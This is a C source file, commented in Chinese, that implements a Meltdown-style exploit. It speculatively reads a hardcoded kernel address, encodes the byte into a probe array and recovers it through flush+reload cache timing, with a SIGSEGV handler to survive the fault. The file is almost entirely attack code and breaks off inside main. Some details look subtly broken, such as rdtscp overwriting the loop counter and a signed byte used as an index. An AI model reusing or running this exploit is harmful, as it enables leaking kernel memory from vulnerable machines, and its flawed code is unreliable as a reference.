#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>

static jmp_buf jmpbuf;
static void sigsegv_handler(int sig) {
    longjmp(jmpbuf, 1);
}

// 用户态探测数组
#define PROBE_SIZE (256 * 4096)
char probe[PROBE_SIZE];

// 尝试读取内核地址并触发缓存加载
void meltdown_read(uint64_t kernel_addr) {
    // 设置信号处理
    signal(SIGSEGV, sigsegv_handler);
    if (setjmp(jmpbuf) == 0) {
        // 尝试读取内核地址（会触发异常）
        char value = *(volatile char*)kernel_addr;
        // 乱序执行：使用value作为索引访问probe
        (void)probe[value * 4096];
    }
    // 异常后继续执行
}

// 测量probe中每个页的访问时间
int detect_cached_byte() {
    // 先Flush所有probe页
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe[i * 4096]);
    }
    _mm_sfence();

    // 执行Meltdown读取
    uint64_t target = 0xffffffff81000000;  // 示例内核地址（需实际系统映射）
    meltdown_read(target);

    // 测量每个页的访问时间
    int results[256] = {0};
    for (int i = 0; i < 256; i++) {
        volatile char *addr = &probe[i * 4096];
        uint64_t start = __rdtscp(&i);
        (void)*addr;
        uint64_t end = __rdtscp(&i);
        if (end - start < 100) {
            results[i]++;
        }
    }
    // 返回最快索引
    int best = 0;
    for (int i = 0; i < 256; i++) {
        if (results[i] > results[best]) best = i;
    }
    return best;
}

int main() {
    // 初始化probe数组
    for (int i = 0; i < PROBE_SIZE; i++) probe[i] = 1;

